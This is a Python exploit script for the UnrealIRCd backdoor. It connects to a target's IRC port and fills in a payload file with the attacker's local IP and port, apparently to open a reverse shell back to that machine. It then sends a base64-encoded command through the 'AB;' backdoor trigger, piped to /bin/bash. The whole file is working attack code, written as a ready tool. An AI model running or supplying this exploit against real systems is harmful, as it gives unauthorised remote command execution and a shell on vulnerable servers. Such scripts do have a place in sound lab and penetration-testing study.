import socket
import base64
import argparse


def main():
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--target-ip', '-t', type=str, help='ip of the target machine', required=True)
    parser.add_argument('--target-port', type=int, help='port of the target machine', default=6667)
    parser.add_argument('--local-ip', '-l', type=str, help='ip of the local machine', required=True)
    parser.add_argument('--local-port', type=int, help='port of the local machine', default=1234)
    
    args = parser.parse_args()
    
    print(vars(args))  
    
    try:
        s = socket.create_connection((args.target_ip, args.target_port))
    except socket.error as error:
        print('Connection to target failed...')
        print(error)
        return

    with open('payload.py', 'r') as f:
        script_content = f.read()

    script_inline = script_content.replace('\n', ';').replace('  ', ' ')
    script_inline = script_inline.replace('\'LOCALIP\'', f'\'{args.local_ip}\'')
    script_inline = script_inline.replace('\'LOCALPORT\'', f'{args.local_port}')
    script_inline = f"python -c \"{script_inline}\""

    encoded = base64.b64encode(script_inline.encode()).decode()
    

    # UnrealIRCd backdoor format: AB;command
    # Decode and pipe to python
    payload = f"AB; echo {encoded} | base64 -d | /bin/bash\n"

    print(f"Sending payload ({len(payload)} bytes)...")
    s.sendall(payload.encode())

    try:
        s.settimeout(2)
        data = s.recv(4096)
        if data:
            print(f"Server response: {data.decode(errors='ignore')}")
            print('Exploit sent successfully!')
    except socket.timeout:
        print('No response (payload may have executed)')

    s.close()
    
if __name__ == "__main__":
    main()